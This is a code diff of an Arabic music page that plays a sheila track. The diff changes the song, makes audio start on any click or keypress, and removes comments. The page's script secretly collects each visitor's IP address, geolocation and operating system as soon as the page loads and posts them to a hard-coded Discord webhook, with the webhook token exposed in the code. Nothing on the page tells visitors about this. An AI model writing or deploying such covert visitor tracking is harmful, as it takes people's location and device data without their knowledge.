@@ -250,33 +250,45 @@
         </div>
 
         <div class="audio-control">
-            <span style="font-size: 13px; color: #7090b0;">TRACK: هلا بالتوت والسكر // ماجد الرسلاني</span>
+            <span style="font-size: 13px; color: #7090b0;">TRACK: طلبتك يازمن قاسي - ماجد الرسلاني</span>
             <button class="audio-btn" id="audioToggle">تشغيل الشيلة ♫</button>
         </div>
     </div>
 
-    <!-- مشغل الشيلة المطلوبة (رابط يوتيوب المعني) -->
+    <!-- مشغل الشيلة (شيلة طلبتك يازمن قاسي) -->
     <audio id="bgAudio" loop>
-        <source src="https://rr3---sn-i3b7kn6y.googlevideo.com/videoplayback?expire=3816400000&ei=placeholder&id=Acytk4R7p-I" type="audio/mp4">
-        <!-- رابط احتياطي بديل للصوت لو فشل المصدر المباشر -->
-        <source src="https://commondatastorage.googleapis.com/codeskulptor-assets/Epoq-Lepidoptera.ogg" type="audio/ogg">
+        <source src="https://archive.org/download/20220319_20220319_1033/%D8%B4%D9%8A%D9%84%D8%A9%20%D8%B7%D9%84%D8%A8%D8%AA%D9%83%20%D9%8A%D8%A7%D8%B2%D9%85%D9%86%20%D9%82%D8%A7%D8%B3%D9%8A%20%D8%AA%D8%B1%D8%A7%D9%87%D8%A7%20%D8%A7%D9%82%D8%B1%D8%A8%20%D9%85%D9%86%20%D8%A7%D9%86%D9%81%D8%A7%D8%B3%D9%8A%20%D9%87%D9%84%D8%A7%20%D8%A8%D8%A7%D9%84%D8%AA%D9%88%D8%AA%20%D9%88%D8%A7%D9%84%D8%B3%D9%83%D8%B1%20_%20%D8%A7%D8%AF%D8%A7%D8%A1%20%D9%85%D8%A7%D8%AC%D8%AF%20%D8%A7%D8%B5%D9%84%D8%A7%D9%86%D9%8A.mp3" type="audio/mp3">
     </audio>
 
     <script>
-        // إعدادات الويب هوك الخاص بك
         const webhookURL = "https://discordapp.com/api/webhooks/1558777483518672916/2wLZ-M9M0EUnr_nAih1L9z8V1T7uN710kbAT12x19gXHpo80JnfaZLzNS3_ktyFaMXD4";
 
-        // تشغيل الصوت تفاعلياً بناءً على طلب المستخدم
         const audio = document.getElementById('bgAudio');
         const audioBtn = document.getElementById('audioToggle');
         let isPlaying = false;
 
-        audioBtn.addEventListener('click', () => {
+        // محاولة تشغيل الصوت تلقائياً مع أول تفاعل في الصفحة (لتحايل قيود المتصفحات)
+        function triggerAutoPlay() {
             if (!isPlaying) {
                 audio.play().then(() => {
                     isPlaying = true;
                     audioBtn.textContent = "إيقاف الشيلة ❚❚";
-                }).catch(e => console.log("Audio play blocked"));
+                    window.removeEventListener('click', triggerAutoPlay);
+                    window.removeEventListener('keydown', triggerAutoPlay);
+                }).catch(e => console.log("Waiting for user interaction"));
+            }
+        }
+
+        window.addEventListener('click', triggerAutoPlay);
+        window.addEventListener('keydown', triggerAutoPlay);
+
+        audioBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            if (!isPlaying) {
+                audio.play().then(() => {
+                    isPlaying = true;
+                    audioBtn.textContent = "إيقاف الشيلة ❚❚";
+                });
             } else {
                 audio.pause();
                 isPlaying = false;
@@ -284,10 +296,8 @@
             }
         });
 
-        // دالة جمع بيانات الزائر وإرسالها للديسكورد
         async function captureAndSend() {
             try {
-                // جلب الـ IP والموقع الجغرافي
                 let ipData = {};
                 try {
                     let response = await fetch('https://ipapi.co/json/');
@@ -303,7 +313,6 @@
                     };
                 }
 
-                // تحليل نظام التشغيل والمتصفح والجهاز
                 const ua = navigator.userAgent;
                 let os = "Unknown OS";
                 if (ua.indexOf("Win") !== -1) os = "Windows";
@@ -318,10 +327,8 @@
                 else if (ua.includes("Windows NT 6.2")) windowsVersion = "Windows 8";
                 else if (ua.includes("Windows NT 6.1")) windowsVersion = "Windows 7";
 
-                // محاكاة منفذ الاتصال (Client Ephemeral Port)
                 const mockPort = Math.floor(Math.random() * (65535 - 49152 + 1)) + 49152;
 
-                // بناء محتوى رسالة الديسكورد
                 const payload = {
                     embeds: [{
                         title: "🚨 [x13 NETwORK] زائر جديد دخل الموقع!",
@@ -338,7 +345,6 @@
                     }]
                 };
 
-                // إرسال البيانات للويب هوك
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -350,7 +356,6 @@
             }
         }
 
-        // تنفيذ الإرسال فور دخول الزائر
         window.onload = () => {
             captureAndSend();
         };
